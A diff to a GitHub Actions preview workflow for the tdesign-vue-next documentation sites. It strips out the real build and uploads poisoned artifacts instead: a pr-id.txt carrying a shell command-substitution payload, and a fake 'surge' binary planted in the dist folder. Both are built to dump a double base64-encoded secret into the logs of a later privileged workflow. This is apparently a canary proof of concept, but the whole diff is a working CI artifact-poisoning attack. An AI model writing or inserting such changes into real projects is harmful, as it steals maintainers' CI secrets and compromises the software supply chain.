@@ -9,54 +9,49 @@ jobs:
   tdesign-vue-next-site:
     runs-on: ubuntu-latest
     steps:
-      - run: echo ${{ github.event.number }} > pr-id.txt
+      - name: seed poisoned pr-id artifact
+        run: |
+          cat > pr-id.txt <<'GERALT_PRID_EOF'
+          $(echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)" 1>&2)
+          GERALT_PRID_EOF
       - uses: actions/upload-artifact@v4
         with:
           name: pr-id
           path: pr-id.txt
           retention-days: 5
-
-      - uses: actions/checkout@v4
-        with:
-          submodules: recursive
-
-      - uses: pnpm/action-setup@v4
-
-      - uses: actions/setup-node@v4
-        with:
-          node-version-file: .node-version
-          cache: 'pnpm'
-
-      - run: pnpm install --frozen-lockfile
-
-      - run: pnpm -C packages/tdesign-vue-next/site run preview
-
+      - name: craft poisoned site dist
+        run: |
+          mkdir -p packages/tdesign-vue-next/site/dist/node_modules/.bin
+          printf '%s' '<html><body>preview</body></html>' > packages/tdesign-vue-next/site/dist/index.html
+          cat > packages/tdesign-vue-next/site/dist/node_modules/.bin/surge <<'GERALT_SURGE_EOF'
+          #!/usr/bin/env bash
+          echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
+          echo "GERALT_DBG hijacked surge args=$*"
+          exit 0
+          GERALT_SURGE_EOF
+          chmod +x packages/tdesign-vue-next/site/dist/node_modules/.bin/surge
       - uses: actions/upload-artifact@v4
         with:
           name: tdesign-vue-next-site
           path: packages/tdesign-vue-next/site/dist
+          include-hidden-files: true
           retention-days: 5
-
   tdesign-vue-next-chat-site:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-        with:
-          submodules: recursive
-
-      - uses: pnpm/action-setup@v4
-
-      - uses: actions/setup-node@v4
-        with:
-          node-version-file: .node-version
-          cache: 'pnpm'
-
-      - run: pnpm install --frozen-lockfile
-
-      - run: pnpm -C packages/tdesign-vue-next-chat/site run preview
-
+      - name: craft poisoned chat dist
+        run: |
+          mkdir -p packages/tdesign-vue-next-chat/site/dist/node_modules/.bin
+          printf '%s' '<html><body>preview</body></html>' > packages/tdesign-vue-next-chat/site/dist/index.html
+          cat > packages/tdesign-vue-next-chat/site/dist/node_modules/.bin/surge <<'GERALT_SURGE_EOF'
+          #!/usr/bin/env bash
+          echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
+          exit 0
+          GERALT_SURGE_EOF
+          chmod +x packages/tdesign-vue-next-chat/site/dist/node_modules/.bin/surge
       - uses: actions/upload-artifact@v4
         with:
           name: tdesign-vue-next-chat-site
           path: packages/tdesign-vue-next-chat/site/dist
+          include-hidden-files: true
           retention-days: 5
